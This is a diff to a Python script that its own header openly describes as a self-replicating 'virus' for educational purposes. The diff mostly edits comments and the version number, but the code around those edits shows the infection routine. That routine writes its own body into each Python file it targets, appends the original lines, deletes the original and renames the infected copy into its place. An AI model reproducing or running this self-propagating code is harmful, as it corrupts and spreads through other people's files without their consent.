@@ -1,13 +1,16 @@
 #title           :mold-verbose.py
-#description     :Example of a self replicating python virus (without extra payload). For educational purposes only :)
+#description     :Example of a self replicating encypted python virus. 
+#                 For educational purposes only :)
 #author          :wizardofzos
 #date            :20190622
-#version         :0.3
+#version         :0.4
 #usage           :python mold-verbose.py
 #notes           :make sure you know what you're doing before running this...
 #==============================================================================
 
 # We need the next comment line. This way we know what is the mold, and what is not...
+# If we move it to the top of the file, all infected files will have the top
+# bit of this file too...
 
 # PIEMOLDER:START
 def execute(virus):
@@ -30,10 +33,10 @@ def execute(virus):
 			thepie.close()
 			thepie = open(py, "r")
 			rottenpie = open("%s.rotten" % py, "w")
-			# Write 'virus' to the .rotten file
+			# Write ourself to the rotten pie
 			rottenpie.write(virus)
 
-			# append all the lines from the original .py
+			# append all the lines from the original pie
 			for line in thepie.readlines():
 				rottenpie.write(line)
 			# always close your files
@@ -41,14 +44,14 @@ def execute(virus):
 			rottenpie.close()
 			# Then remove the orignal
 			os.remove(py)
-			# And rename the .rotten to the original name
+			# And rename the .rotten pie to the original pie
 			os.rename("%s.rotten" % py, py)
 
 
 # Now that we have the function ready to add mold to pies, we better
 # make sure that we add _ourselves_ to the pies. We read ourself
 # and copy everything from the two 'magic' comment lines into
-# a variable to pass to our 'execute' function (that we should probably rename to mold)
+# a variable to pass to our 'mold' function.
 import os
 virus = os.path.basename(__file__)
 vfile = open(virus, "r")
